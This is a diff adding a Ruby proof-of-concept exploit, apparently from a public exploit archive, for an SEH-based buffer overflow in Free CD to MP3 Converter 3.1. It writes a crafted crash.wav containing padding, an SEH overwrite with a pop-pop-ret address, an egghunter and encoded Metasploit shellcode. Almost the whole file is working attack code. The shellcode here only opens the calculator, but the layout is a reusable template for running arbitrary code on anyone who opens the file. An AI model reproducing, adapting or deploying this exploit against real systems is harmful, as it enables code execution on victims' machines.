@@ -1,0 +1,54 @@
+# Exploit Title: Free CD to MP3 Converter 3.1 Buffer Overflow Exploit (SEH)
+# Date: 10/18/10
+# Credit/Bug found by: C4SS!0 G0M3S
+# Software Link: http://www.eusing.com/Download/cdtomp3freeware.exe
+# Version: 3.1
+# Tested on: Windows XP SP3 EN (VMWARE FUSION - Version 3.1.1)
+# CVE: N/A
+ 
+#! /usr/bin/env ruby
+filename = 'crash.wav'
+
+# windows/exec - 144 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+# EXITFUNC=seh, CMD=calc
+shellcode = ''
+shellcode <<  "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc"
+shellcode << "\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78"
+shellcode << "\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85"
+shellcode << "\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5"
+shellcode << "\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c"
+shellcode << "\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21"
+shellcode << "\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5"
+shellcode << "\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27"
+shellcode << "\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3"
+shellcode << "\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53"
+shellcode << "\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f"
+shellcode << "\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6"
+shellcode << "\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8"
+shellcode << "\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
+shellcode << "\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f"
+shellcode << "\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca"
+
+egghunter = ''
+egghunter << "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
+egghunter << "\x77\x30\x30\x74"
+egghunter << "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+
+junk1	= 'A' * 4156
+nseh	= [0x06eb9090].pack('V') # jmp short 6 byte
+seh		= [0x00409F8C].pack('V') # cdextract.exe
+nops	= "\x90" * 50
+junk2	= 'B' * (10000 - (junk1 + nseh + seh + nops + egghunter + nops + "w00tw00t" + shellcode).length)
+
+# [junk1 'A'][nseh - short jmp)][seh -pop pop ret][nops][egghunter][nops]['w00tw00t'][shellcode][junk2 'B']
+#              (2)|   ^___________________|(1)      ^(3)--> (4)         (5)Tag found!--> (6)   
+#                 |_________________________________|
+
+xploit	= junk1 + nseh + seh + nops + egghunter + nops + "w00tw00t" + shellcode + junk2
+
+File.open(filename,'w') do |fd|
+	fd.write xploit
+	puts "xploit file size : #{xploit.length.to_s}"
+end
